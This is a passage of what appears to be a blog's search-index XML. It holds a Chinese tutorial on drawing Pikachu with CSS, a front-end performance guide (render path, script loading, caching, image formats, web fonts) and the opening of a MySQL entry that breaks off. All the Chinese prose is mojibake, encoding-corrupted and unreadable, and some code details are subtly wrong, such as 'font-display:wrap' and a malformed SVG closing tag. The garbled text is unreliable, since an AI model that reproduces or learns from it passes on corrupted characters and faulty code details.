    <title><![CDATA[å¦‚ä½•ç”¨CSSç”»ä¸€åªç”µè€é¼ ]]></title>
    <url>%2F2019%2F05%2F12%2Fpikachu%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¦‚ä½•ç”¨CSSç”»ä¸€åªç”µè€é¼  ä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰åŽ»çœ‹å¤§ä¾¦æŽ¢çš®å¡ä¸˜å‘€ï¼Œæœ‰æ²¡æœ‰è¢«é“¶å¹•ä¸Šæ¯›èŒ¸èŒ¸çš„ç”µè€é¼ èŒåˆ°å‘¢ï¼ŸçŽ°åœ¨æˆ‘å°±æ¥ç”¨CSSç”»ä¸€åªç®€æ˜“ç‰ˆçš„çš®å¡ä¸˜å§ã€‚ï¼ˆå¸Œæœ›ä¸ä¼šæ”¶åˆ°ä¸œåŠçƒæœ€å¼ºæ³•åŠ¡éƒ¨çš„å¾‹å¸ˆå‡½ï¼‰ 12345678910111213141516171819&lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;head&quot;&gt; &lt;div class=&quot;ear left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ear right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;eye left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;eye right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;face left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;face right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;mouth&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;ball&quot;&gt; &lt;div class=&quot;belt&quot;&gt; &lt;div class=&quot;lock&quot;&gt; &lt;div class=&quot;but&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;light&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177body&#123; display: flex; justify-content: center; align-items: center; min-height: 100vh; &#125;.main&#123; position: relative;&#125;.ear.left&#123; background: #ffe000; width:40px; height:90px; position: absolute; top:-44px; left:0; border-radius: 20px 20px 20px 20px/70px 070px 20px 20px; transform: rotate(-30deg); display: flex; justify-content: center; overflow: hidden;&#125;.ear.left::after&#123; content: &quot;&quot;; display: block; width:30px; height:20px; background: #4E4700; border-radius: 15px 15px 20px 20px/70px 70px 20px 20px;&#125;.ear.right&#123; background:#ffe000; width:40px; height:90px; position: absolute; top:-44px; right:0; border-radius: 20px 20px 20px 20px/70px 070px 20px 20px; transform: rotate(35deg); display: flex; justify-content: center; overflow: hidden;&#125;.ear.right::after&#123; content: &quot;&quot;; display: block; width:30px; height:20px; background: #4E4700; border-radius: 15px 15px 20px 20px/70px 70px 20px 20px;&#125;.eye&#123; background: #4E4700; width: 23px; height: 23px; border-radius: 23px;&#125;.eye.left&#123; position: absolute; left:38px; top:44px;&#125;.eye.right&#123; position: absolute; right:38px; top:44px;&#125;.mouth::before&#123; content: &apos;&apos;; display: block; width: 10px; height: 10px; border: 3px solid #4E4700; border-top:none; border-right: none; border-bottom-left-radius: 10px ; transform: rotateZ(-23deg); position: absolute; top:60px; left:86px;&#125;.mouth::after&#123; content: &apos;&apos;; display: block; width: 10px; height: 10px; border: 3px solid #4E4700; border-top: none; border-left: none; border-bottom-right-radius: 10px; transform: rotateZ(23deg); position: absolute; top:60px; right:86px;&#125;.head&#123; border-radius: 200px 200px 0 0; width:200px; height:100px; background:#ffe000;&#125;.face&#123; background:#FF9900; width:30px; height: 30px; border-radius: 30px; &#125;.face.left&#123; position: absolute; left:18px; bottom:101px;;&#125;.face.right&#123; position: absolute; right:18px; bottom:101px;&#125;.ball&#123; border-radius:0 0 200px 200px; width:200px; height:100px; background:#FF0000;&#125;.belt&#123; width:200px; height:15px; background:#322221; border-radius:0 0 2px 2px/0 0 15px 15px; display: flex; justify-content: center;&#125;.lock&#123; border-radius: 0 0 80px 80px; width:80px; height:40px; background:#322221;&#125;.lock::after&#123; content: &quot;&quot;; display:block; border-radius: 0 0 60px 60px; width:60px; height:30px; background:#FDFDFD; transform: translateX(10px);&#125;.but&#123; content: &quot;&quot;; display:block; border-radius: 0 0 40px 40px; width:40px; height:20px; background:#322221; transform: translateX(20px); position: absolute; z-index: 10;&#125;.but::after&#123; content: &quot;&quot;; display:block; border-radius: 0 0 20px 20px; width:20px; height:10px; background:#686160; transform: translateX(10px);&#125;.light&#123; background:#FFD7C9; width: 20px; height: 27px; border-radius: 10px 10px 10px 10px/15px 15px 10px 10px; position: absolute; top:150px; left:150px; transform: rotate(45deg);&#125;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ€§èƒ½ä¼˜åŒ–]]></title>
    <url>%2F2019%2F04%2F04%2Foptimization%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ€§èƒ½ä¼˜åŒ– å…³é”®æ¸²æŸ“è·¯å¾„ å¤„ç† HTML æ ‡è®°å¹¶æž„å»º DOM æ ‘ã€‚ å¤„ç† CSS æ ‡è®°å¹¶æž„å»º CSSOM æ ‘ã€‚(CSS è¢«è§†ä¸ºé˜»å¡žæ¸²æŸ“çš„èµ„æºï¼Œè¿™æ„å‘³ç€æµè§ˆå™¨å°†ä¸ä¼šæ¸²æŸ“ä»»ä½•å·²å¤„ç†çš„å†…å®¹ï¼Œç›´è‡³ CSSOM æž„å»ºå®Œæ¯•ã€‚) å°† DOM ä¸Ž CSSOM åˆå¹¶æˆä¸€ä¸ªæ¸²æŸ“æ ‘ã€‚ æ ¹æ®æ¸²æŸ“æ ‘æ¥å¸ƒå±€ã€‚ å°†å„ä¸ªèŠ‚ç‚¹ç»˜åˆ¶åˆ°å±å¹•ä¸Šã€‚å½“DOMæˆ–è€…CSSOMå‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°±éœ€è¦å†æ¬¡æ‰§è¡Œä¸€æ¬¡ä¸Šé¢çš„æ­¥éª¤ã€‚ å½“HTMLè§£æžè¿‡ç¨‹ä¸­é‡åˆ°ä¸€ä¸ªscriptæ ‡è®°æ—¶ï¼Œå®ƒä¼šæš‚åœDOMæž„å»ºï¼Œå°†æŽ§åˆ¶æƒç§»äº¤ç»™JavaScriptå¼•æ“Žï¼Œç­‰JavaScriptå¼•æ“Žè¿è¡Œå®Œæ¯•ï¼Œæµè§ˆå™¨å†ä»Žä¸­æ–­çš„åœ°æ–¹æ¢å¤DOMæž„å»ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œå†…è”çš„JavaScriptä¼šé˜»å¡žé¡µé¢çš„é¦–æ¬¡æ¸²æŸ“ã€‚ å¯¹JSä¼˜åŒ– å¼•ç”¨JSæ–¹å¼asyncï¼Œå®Œå…¨çš„å¼‚æ­¥æ“ä½œï¼ŒHTMLè§£æžé‡åˆ°è¯¥æ ‡ç­¾åŽï¼Œå‘å‡ºç½‘ç»œè¯·æ±‚ï¼Œä½†ä¸é˜»æ­¢HTMLè§£æžå’Œå…¶åŽé¢çš„æ¸²æŸ“æ“ä½œï¼Œå½“JavaScriptè¯·æ±‚è¿”å›žåŽç«‹åˆ»æ‰§è¡Œï¼Œä¸”ä¸ç­‰å¾…HTMLè§£æžæˆ–å…¶ä»–æ“ä½œçš„å®Œæˆã€‚æ‰€ä»¥ï¼Œå¦‚æžœè„šæœ¬ä¸­æœ‰DOMæ“ä½œï¼Œå°±å¹¶ä¸é€‚åˆã€‚deferï¼ŒHTMLçš„è§£æžå’Œå¯¹JavaScriptèµ„æºçš„ç½‘ç»œè¯·æ±‚æ˜¯å¹¶è¡Œçš„ï¼Œä½†å®ƒä¼šç­‰å¾…HTMLè§£æžå®Œæˆä¹‹åŽï¼Œæ‰æ‰§è¡Œè„šæœ¬ã€‚ å¯¹CSSä¼˜åŒ– å°½æ—©å’ŒæŒ‰éœ€çš„åŠ è½½CSS å†…è”CSSæ¥æé«˜æ¸²æŸ“æ€§èƒ½ å†™æ ·å¼å°½é‡ä½¿ç”¨classå’Œidï¼Œä¿è¯å±‚çº§æ‰å¹³ï¼Œå‡å°‘è¿‡åº¦å±‚å  é¿å…ä½¿ç”¨CSSè¡¨è¾¾å¼ä¸¾ä¸ªcssè¡¨è¾¾å¼çš„ä¾‹å­ font-color: expression( (new Date()).getHours()%3 ? â€œ#FFFFFFâ€ : â€œ#AAAAAAâ€ );è¿™ä¸ªè¡¨è¾¾å¼ä¼šæŒç»­çš„åœ¨é¡µé¢ä¸Šè®¡ç®—æ ·å¼ï¼Œå½±å“é¡µé¢çš„æ€§èƒ½ã€‚å¹¶ä¸”cssè¡¨è¾¾å¼åªè¢«IEæ”¯æŒã€‚ ä¸åŒæµè§ˆå™¨é¦–å±æ¸²æŸ“ç­–ç•¥ä¸åŒã€‚chromeç­‰CSSåŠ è½½å®Œå†æ¸²æŸ“ï¼ŒFirefoxå…ˆç”ŸæˆHTMLå†é™„ä¸ŠCSS å‡å°‘HTTPè¯·æ±‚ å°½é‡å°‘ä½¿ç”¨å¤–é“¾çš„JSå’ŒCSSæ–‡ä»¶ä»¥å‰CSSçš„@import é›ªç¢§å›¾ï¼Œå°½é‡åˆå¹¶å›¾ç‰‡ã€CSSã€JS æ¸²æŸ“å¿…å¤‡CSSå†…è”åˆ°HTMLä¸­ ç¼“å­˜ç­–ç•¥ åˆ é™¤é‡å¤çš„JSå’ŒCSSé‡å¤è°ƒç”¨è„šæœ¬ï¼Œé™¤äº†å¢žåŠ é¢å¤–çš„HTTPè¯·æ±‚å¤–ï¼Œå¤šæ¬¡è¿ç®—ä¹Ÿä¼šæµªè´¹æ—¶é—´ã€‚åœ¨IEå’ŒFirefoxä¸­ä¸ç®¡è„šæœ¬æ˜¯å¦å¯ç¼“å­˜ï¼Œå®ƒä»¬éƒ½å­˜åœ¨é‡å¤è¿ç®—JavaScriptçš„é—®é¢˜ã€‚ å¯ç¼“å­˜çš„AJAXå¼‚æ­¥è¯·æ±‚åŒæ ·çš„é€ æˆç”¨æˆ·ç­‰å¾…ï¼Œæ‰€ä»¥ä½¿ç”¨ajaxè¯·æ±‚æ—¶ï¼Œè¦ä¸»åŠ¨å‘Šè¯‰æµè§ˆå™¨å¦‚æžœè¯¥è¯·æ±‚æœ‰ç¼“å­˜å°±åŽ»è¯·æ±‚ç¼“å­˜å†…å®¹ã€‚å¦‚ä¸‹ä»£ç ç‰‡æ®µ, cache:trueå°±æ˜¯æ˜¾å¼çš„è¦æ±‚å¦‚æžœå½“å‰è¯·æ±‚æœ‰ç¼“å­˜çš„è¯ï¼Œç›´æŽ¥ä½¿ç”¨ç¼“å­˜ 123456$.ajax(&#123; url : &apos;url&apos;, dataType : &quot;json&quot;, cache: true, success : function(son, status)&#123; &#125; å‡å°‘Cookieçš„å¤§å°Cookieé‡Œé¢åˆ«å¡žé‚£ä¹ˆå¤šä¸œè¥¿ï¼Œå› ä¸ºæ¯ä¸ªè¯·æ±‚éƒ½å¾—å¸¦ç€ä»–è·‘ ä½¿ç”¨æ— cookieçš„åŸŸæ¯”å¦‚CSSã€jsã€å›¾ç‰‡ç­‰ï¼Œå®¢æˆ·ç«¯è¯·æ±‚é™æ€æ–‡ä»¶çš„æ—¶å€™ï¼Œå‡å°‘äº† Cookie çš„åå¤ä¼ è¾“å¯¹ä¸»åŸŸåçš„å½±å“ã€‚ å‡å°‘èµ„æºçš„å¤§å° åŽ‹ç¼©ã€åŽ»æ³¨é‡Š JavaScript å’Œ CSS ä½¿ç”¨gzipåŽ‹ç¼©å†…å®¹gzipèƒ½å¤ŸåŽ‹ç¼©ä»»ä½•ä¸€ä¸ªæ–‡æœ¬ç±»åž‹çš„å“åº”ï¼ŒåŒ…æ‹¬htmlï¼Œxmlï¼Œjsonã€‚å¤§å¤§ç¼©å°è¯·æ±‚è¿”å›žçš„æ•°æ®é‡ã€‚ å»¶è¿ŸJavaScriptéžé˜»å¡žèµ„æºåŠ è½½ åˆ é™¤æœªä½¿ç”¨çš„ä»£ç  å¼‚æ­¥æ‡’åŠ è½½ä»£ç  æ‡’åŠ è½½å±å¹•å¤–å›¾ç‰‡ é¢„å…ˆåŠ è½½å…³é”®è¯·æ±‚ HTTPçš„ä¼ è¾“å±‚åè®®æ˜¯TCPï¼ŒTCPåè®®æœ‰ä¸€ä¸ªæ…¢å¯åŠ¨çš„è¿‡ç¨‹ï¼Œå³å®ƒåœ¨ç¬¬ä¸€æ¬¡ä¼ é€’æ•°æ®æ—¶ï¼Œåªèƒ½åŒæ—¶ä¼ é€’14kbçš„æ•°æ®å—ï¼Œæ‰€ä»¥å½“æ•°æ®è¶…å¤š14kbæ—¶ï¼ŒTCPåè®®ä¼ é€’æ•°æ®å®žé™…æ˜¯å¤šæ¬¡çš„å¾€è¿”ï¼ˆroundtripï¼‰ã€‚å¦‚æžœèƒ½å¤Ÿå°†æ¸²æŸ“æ‰€éœ€è¦çš„èµ„æºæŽ§åˆ¶åœ¨14kbä¹‹å†…ï¼Œé‚£ä¹ˆå°±èƒ½TCPåè®®å¯åŠ¨æ—¶ï¼Œä¸€æ¬¡å®Œæˆæ•°æ®çš„ä¼ é€’ã€‚ CDNä½¿ç”¨CDNç½‘ç«™ä¸Šé™æ€èµ„æºå³cssã€jsã€å›¾ç‰‡å…¨éƒ½ä½¿ç”¨cdnåˆ†å‘ å›¾åƒJPG/JPEGä¼˜ç‚¹JPGçš„åŽ‹ç¼©æ–¹å¼ï¼ˆæœ‰æŸåŽ‹ç¼©ï¼‰æ˜¯ä¸€ç§é«˜è´¨é‡çš„åŽ‹ç¼©æ–¹å¼ï¼šå½“æˆ‘ä»¬æŠŠå›¾ç‰‡ä½“ç§¯åŽ‹ç¼©è‡³åŽŸæœ‰ä½“ç§¯çš„ 50% ä»¥ä¸‹æ—¶ï¼ŒJPG ä»ç„¶å¯ä»¥ä¿æŒä½ 60% çš„å“è´¨ã€‚æ­¤å¤–ï¼ŒJPG æ ¼å¼ä»¥ 24 ä½å­˜å‚¨å•ä¸ªå›¾ï¼Œå¯ä»¥å‘ˆçŽ°å¤šè¾¾ 1600 ä¸‡ç§é¢œè‰²ï¼Œè¶³ä»¥åº”å¯¹å¤§å¤šæ•°åœºæ™¯ä¸‹å¯¹è‰²å½©çš„è¦æ±‚ ç¼ºé™·å¤„ç†çŸ¢é‡å›¾å½¢å’Œ Logo ç­‰çº¿æ¡æ„Ÿè¾ƒå¼ºã€é¢œè‰²å¯¹æ¯”å¼ºçƒˆçš„å›¾åƒæ—¶ï¼Œäººä¸ºåŽ‹ç¼©å¯¼è‡´çš„å›¾ç‰‡æ¨¡ç³Šä¼šæ˜Žæ˜¾ä¸æ”¯æŒé€æ˜Žåº¦å¤„ç† ä½¿ç”¨åœºæ™¯èƒŒæ™¯å›¾ã€è½®æ’­å›¾æˆ– Banner å›¾ PNGä¼˜ç‚¹PNGæ˜¯ä¸€ç§æ— æŸåŽ‹ç¼©çš„é«˜ä¿çœŸçš„å›¾ç‰‡æ ¼å¼ã€‚8 ä½çš„ PNG æœ€å¤šæ”¯æŒ 256 ç§é¢œè‰²ï¼Œè€Œ 24 ä½çš„å¯ä»¥å‘ˆçŽ°çº¦ 1600 ä¸‡ç§é¢œè‰²ã€‚PNG å›¾ç‰‡å…·æœ‰æ¯” JPG æ›´å¼ºçš„è‰²å½©è¡¨çŽ°åŠ›ï¼Œå¯¹çº¿æ¡çš„å¤„ç†æ›´åŠ ç»†è…»ï¼Œå¯¹é€æ˜Žåº¦æœ‰è‰¯å¥½çš„æ”¯æŒã€‚ ç¼ºç‚¹ ä½“ç§¯å¤ªå¤§ã€‚ ä½¿ç”¨åœºæ™¯å°çš„ Logoã€é¢œè‰²ç®€å•ä¸”å¯¹æ¯”å¼ºçƒˆçš„å›¾ç‰‡æˆ–èƒŒæ™¯ SVGä¼˜ç‚¹SVG æŒ‡å¯ä¼¸ç¼©çŸ¢é‡å›¾å½¢ ï¼Œå±žäºŽå¯¹å›¾åƒçš„å½¢çŠ¶æè¿°ï¼Œæœ¬è´¨ä¸Šæ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œä½“ç§¯è¾ƒå°ï¼Œä¸”ä¸ç®¡æ”¾å¤§å¤šå°‘å€éƒ½ä¸ä¼šå¤±çœŸã€‚ ç¼ºç‚¹ç»˜åˆ¶å¤ªå¤æ‚ ä½¿ç”¨åœºæ™¯LOGO ä½¿ç”¨æ–¹æ³• ç›´æŽ¥æ’å…¥ç½‘é¡µï¼Œæˆä¸º DOM çš„ä¸€éƒ¨åˆ† 12345678&lt;svg id=&quot;mysvg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 800 600&quot; preserveAspectRatio=&quot;xMidYMid meet&quot;&gt; &lt;circle id=&quot;mycircle&quot; cx=&quot;400&quot; cy=&quot;300&quot; r=&quot;50&quot; /&gt;&lt;svg&gt; å†™åœ¨ä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶ä¸­ï¼Œç„¶åŽç”¨ã€ã€ã€ç­‰æ ‡ç­¾æ’å…¥ç½‘é¡µ 1234&lt;img src=&quot;circle.svg&quot;&gt;&lt;object id=&quot;object&quot; data=&quot;circle.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;&lt;embed id=&quot;embed&quot; src=&quot;icon.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;iframe id=&quot;iframe&quot; src=&quot;icon.svg&quot;&gt;&lt;/iframe&gt; è½¬ä¸º BASE64 ç¼–ç ï¼Œç„¶åŽä½œä¸º Data URI å†™å…¥ç½‘é¡µã€‚ 1&lt;img src=&quot;data:image/svg+xml;base64,[data]&quot;&gt; é‡è¦å±žæ€§ 123fillï¼šå¡«å……è‰²strokeï¼šæè¾¹è‰²stroke-widthï¼šè¾¹æ¡†å®½åº¦ WebPä¼˜ç‚¹ä¸Ž PNG ç›¸æ¯”ï¼ŒWebP æ— æŸå›¾åƒçš„å°ºå¯¸ç¼©å°äº† 26ï¼…ã€‚åœ¨ç­‰æ•ˆçš„ SSIM è´¨é‡æŒ‡æ•°ä¸‹ï¼ŒWebP æœ‰æŸå›¾åƒæ¯”åŒç±» JPEG å›¾åƒå°25-34ï¼…ã€‚ æ— æŸ WebP æ”¯æŒé€æ˜Žåº¦ï¼ˆä¹Ÿç§°ä¸º alpha é€šé“ï¼‰ï¼Œä»…éœ€ 22ï¼… çš„é¢å¤–å­—èŠ‚ã€‚å¯¹äºŽæœ‰æŸ RGB åŽ‹ç¼©å¯æŽ¥å—çš„æƒ…å†µï¼Œæœ‰æŸ WebP ä¹Ÿæ”¯æŒé€æ˜Žåº¦ï¼Œä¸Ž PNG ç›¸æ¯”ï¼Œé€šå¸¸æä¾› 3 å€çš„æ–‡ä»¶å¤§å°ã€‚WebP æ˜¯è°·æ­Œå¼•å…¥çš„ä¸€ç§ç›¸å¯¹è¾ƒæ–°çš„æ ¼å¼ï¼Œå®ƒçš„ç›®æ ‡æ˜¯é€šè¿‡ä»¥æ— æŸå’Œæœ‰æŸæ ¼å¼ç¼–ç å›¾åƒæ¥æä¾›æ›´å°çš„æ–‡ä»¶å¤§å°ï¼Œä½¿å…¶æˆä¸º JPEG å’Œ PNG çš„ä¸€ä¸ªå¾ˆå¥½çš„æ›¿ä»£æ–¹æ¡ˆã€‚WebP å›¾åƒçš„æ¸…æ™°åº¦é€šå¸¸å¯ä»¥ä¸Ž JPEG å’Œ PNGç›¸æå¹¶è®ºï¼Œè€Œä¸”æ–‡ä»¶å¤§å°è¦å°å¾—å¤šã€‚ ç¼ºç‚¹æµè§ˆå™¨æ”¯æŒåº¦ä¸å¤Ÿ ä½¿ç”¨æ–¹å¼ä¸€æ—¦æœ‰äº† WebP å›¾åƒï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ ‡è®°å°†å®ƒä»¬æä¾›ç»™å¯ä»¥ä½¿ç”¨å®ƒä»¬çš„æµè§ˆå™¨ï¼ŒåŒæ—¶å‘ä¸å…¼å®¹ WebP çš„æµè§ˆå™¨ä½¿ç”¨ png æˆ–è€… jpegã€‚ 12345&lt;picture&gt; &lt;source srcset=&quot;sample_image.webp&quot; type=&quot;image/webp&quot;&gt; &lt;source srcset=&quot;sample_image.jpg&quot; type=&quot;image/jpg&quot;&gt; &lt;img src=&quot;sample_image.jpg&quot; alt=&quot;&quot;&gt;&lt;/picture&gt; ç†è§£ image/webp åª’ä½“ç±»åž‹çš„æµè§ˆå™¨å°†ä¸‹è½½ Webp å›¾ç‰‡å¹¶æ˜¾ç¤ºå®ƒï¼Œè€Œå…¶ä»–æµè§ˆå™¨å°†ä¸‹è½½ JPEG å›¾ç‰‡ã€‚ä»»ä½•ä¸æ”¯æŒ çš„æµè§ˆå™¨éƒ½å°†è·³è¿‡æ‰€æœ‰ source æ ‡ç­¾ï¼Œå¹¶åŠ è½½åº•éƒ¨ img æ ‡ç­¾ã€‚å› æ­¤ï¼Œæˆ‘ä»¬é€šè¿‡æä¾›å¯¹æ‰€æœ‰æµè§ˆå™¨ç±»çš„æ”¯æŒï¼Œé€æ­¥å¢žå¼ºäº†æˆ‘ä»¬çš„é¡µé¢ã€‚*å¯ä»¥æ ¹æ®ä¸åŒçš„æ¡ä»¶åŠ è½½ä¸åŒçš„å›¾åƒï¼Œè¿™äº›æ¡ä»¶å¯ä»¥æ˜¯è§†çª—å½“å‰çš„é«˜åº¦ï¼ˆviewportï¼‰ï¼Œå®½åº¦ï¼ˆwidthï¼‰ï¼Œæ–¹å‘ï¼ˆorientationï¼‰ï¼Œåƒç´ å¯†åº¦ï¼ˆdprï¼‰ ç½‘ç»œå­—ä½“åœ¨ç½‘ç»œåŠ è½½æ¯”è¾ƒæ…¢çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯èƒ½ä¼šæ„Ÿå—åˆ°å­—ä½“æˆ–è€…å›¾å½¢çš„å˜åŒ–ï¼ˆIcon Fontï¼‰ã€‚å…¶å®žï¼Œæµè§ˆå™¨åœ¨æ¸²æŸ“æ ‘æž„å»ºå®Œæˆä¹‹åŽï¼Œä¼šæŒ‡ç¤ºéœ€è¦å“ªäº›å­—ä½“åœ¨ç½‘é¡µä¸Šæ¸²æŸ“æŒ‡å®šæ–‡æœ¬ï¼Œç„¶åŽåˆ†æ´¾å­—ä½“è¯·æ±‚ï¼Œæµè§ˆå™¨æ‰§è¡Œå¸ƒå±€å¹¶å°†å†…å®¹ç»˜åˆ¶åˆ°å±å¹•ä¸Šï¼Œå¦‚æžœå­—ä½“å°šä¸å¯ç”¨ï¼Œæµè§ˆå™¨å¯èƒ½ä¸ä¼šæ¸²æŸ“ä»»ä½•æ–‡æœ¬åƒç´ ï¼Œå¾…å­—ä½“å¯ç”¨ä¹‹åŽï¼Œå†ç»˜åˆ¶æ–‡æœ¬åƒç´ ï¼Œå½“ç„¶ï¼Œä¸åŒæµè§ˆå™¨ä¹‹é—´å®žé™…è¡Œä¸ºæœ‰æ‰€å·®å¼‚ 123@font-face&#123; font-display:wrap;&#125; Font display å¯å¸®åŠ©ä½ æ ¹æ®äº¤æ¢æ‰€éœ€çš„æ—¶é—´æ¥å†³å®šç½‘ç»œå­—ä½“çš„æ¸²æŸ“æˆ–é€€é˜¶æ–¹å¼ã€‚ å…¶ä»– é¿å…ç©ºçš„srcå’Œhrefå½“linkæ ‡ç­¾çš„hrefå±žæ€§ä¸ºç©ºã€scriptæ ‡ç­¾çš„srcå±žæ€§ä¸ºç©ºçš„æ—¶å€™ï¼Œæµè§ˆå™¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠå½“å‰é¡µé¢çš„URLä½œä¸ºå®ƒä»¬çš„å±žæ€§å€¼ï¼Œä»Žè€ŒæŠŠé¡µé¢çš„å†…å®¹åŠ è½½è¿›æ¥ä½œä¸ºå®ƒä»¬çš„å€¼ã€‚ é¿å…è·³è½¬æœ‰ç§çŽ°è±¡ä¼šæ¯”è¾ƒå‘çˆ¹ï¼Œçœ‹èµ·æ¥æ²¡ä»€ä¹ˆå·®åˆ«ï¼Œå…¶å®žå¤šæ¬¡äº†ä¸€æ¬¡é¡µé¢è·³è½¬ã€‚æ¯”å¦‚å½“URLæœ¬è¯¥æœ‰æ–œæ ï¼ˆ/ï¼‰å´è¢«å¿½ç•¥æŽ‰æ—¶ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬è¦è®¿é—® http://baidu.com æ—¶ï¼Œå®žé™…ä¸Šè¿”å›žçš„æ˜¯ä¸€ä¸ªåŒ…å«301ä»£ç çš„è·³è½¬ï¼Œå®ƒæŒ‡å‘çš„æ˜¯ http://baidu.com/ï¼ˆæ³¨æ„æœ«å°¾çš„æ–œæ ï¼‰ã€‚åœ¨nginxæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨rewriteï¼›ApacheæœåŠ¡å™¨ä¸­å¯ä»¥ä½¿ç”¨Alias æˆ–è€… mod_rewriteæˆ–è€…the DirectorySlashæ¥é¿å…ã€‚å¦ä¸€ç§æ˜¯ä¸ç”¨åŸŸåä¹‹é—´çš„è·³è½¬ï¼Œ æ¯”å¦‚è®¿é—® http://baidu.com/bbs è·³è½¬åˆ°http://bbs.baidu.com/ã€‚é‚£ä¹ˆå¯ä»¥é€šè¿‡ä½¿ç”¨Aliasæˆ–è€…mod_rewirteå»ºç«‹CNAMEï¼ˆä¿å­˜ä¸€ä¸ªåŸŸåå’Œå¦å¤–ä¸€ä¸ªåŸŸåä¹‹é—´å…³ç³»çš„DNSè®°å½•ï¼‰æ¥æ›¿ä»£ã€‚ å‡å°‘DOMå…ƒç´ æ•°é‡å°±ä¼šå‡å°‘æµè§ˆå™¨çš„è§£æžè´Ÿæ‹… é¿å…404æ¯”å¦‚å¤–é“¾çš„cssæˆ–è€…jsæ–‡ä»¶å‡ºçŽ°é—®é¢˜è¿”å›ž404æ—¶ï¼Œä¼šç ´åæµè§ˆå™¨å¯¹æ–‡ä»¶çš„å¹¶è¡ŒåŠ è½½ã€‚å¹¶ä¸”æµè§ˆå™¨ä¼šæŠŠè¯•å›¾åœ¨è¿”å›žçš„404å“åº”å†…å®¹ä¸­æ‰¾åˆ°å¯èƒ½æœ‰ç”¨çš„éƒ¨åˆ†å½“ä½œJavaScriptä»£ç æ¥æ‰§è¡Œã€‚ ä¸è¦ä½¿ç”¨æ»¤é•œIEç‹¬æœ‰å±žæ€§AlphaImageLoaderç”¨äºŽä¿®æ­£7.0ä»¥ä¸‹ç‰ˆæœ¬ä¸­æ˜¾ç¤ºPNGå›¾ç‰‡çš„åŠé€æ˜Žæ•ˆæžœã€‚è¿™ä¸ªæ»¤é•œçš„é—®é¢˜åœ¨äºŽæµè§ˆå™¨åŠ è½½å›¾ç‰‡æ—¶å®ƒä¼šç»ˆæ­¢å†…å®¹çš„å‘ˆçŽ°å¹¶ä¸”å†»ç»“æµè§ˆå™¨ã€‚åœ¨æ¯ä¸€ä¸ªå…ƒç´ ï¼ˆä¸ä»…ä»…æ˜¯å›¾ç‰‡ï¼‰å®ƒéƒ½ä¼šè¿ç®—ä¸€æ¬¡ï¼Œå¢žåŠ äº†å†…å­˜å¼€æ”¯ï¼Œå› æ­¤å®ƒçš„é—®é¢˜æ˜¯å¤šæ–¹é¢çš„ã€‚å®Œå…¨é¿å…ä½¿ç”¨AlphaImageLoaderçš„æœ€å¥½æ–¹æ³•å°±æ˜¯ä½¿ç”¨PNG8æ ¼å¼æ¥ä»£æ›¿ï¼Œè¿™ç§æ ¼å¼èƒ½åœ¨IEä¸­å¾ˆå¥½åœ°å·¥ä½œã€‚å¦‚æžœä½ ç¡®å®žéœ€è¦ä½¿ç”¨AlphaImageLoaderï¼Œè¯·ä½¿ç”¨ä¸‹åˆ’çº¿_filteråˆä½¿ä¹‹å¯¹IE7ä»¥ä¸Šç‰ˆæœ¬çš„ç”¨æˆ·æ— æ•ˆã€‚ å‚è€ƒèµ„æ–™https://zhuanlan.zhihu.com/p/58419577http://www.ruanyifeng.com/blog/2018/08/svg.htmlhttps://zhuanlan.zhihu.com/p/38548289ã€Šé«˜æ€§èƒ½ç½‘ç«™å»ºè®¾æŒ‡å—ï¼ˆç¬¬äºŒç‰ˆã€‹]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>å‰ç«¯å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQLæ“ä½œä¸€è§ˆ]]></title>
    <url>%2F2019%2F02%2F23%2FMySQL%2F</url>
